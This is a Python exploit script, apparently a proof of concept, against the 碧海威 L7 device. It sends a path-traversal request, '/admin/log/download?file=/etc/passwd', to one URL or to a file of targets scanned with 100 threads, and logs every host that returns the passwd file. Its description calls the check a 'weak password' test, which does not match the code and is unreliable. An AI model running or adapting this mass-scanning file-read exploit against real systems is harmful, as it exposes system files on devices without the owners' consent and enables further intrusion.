import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
                author = 芜湖
                version=1.1.1                            """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="碧海威L7前台——弱口令")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/admin/log/download?file=/etc/passwd'
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=5)
        # print(res1.text)
        if '/bin/bash' in res1.text:
            print(f'[+]{target}爆破成功')
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]{target}爆破失败')
    except:
        print('该站点存在问题')


if __name__ == '__main__':
    main()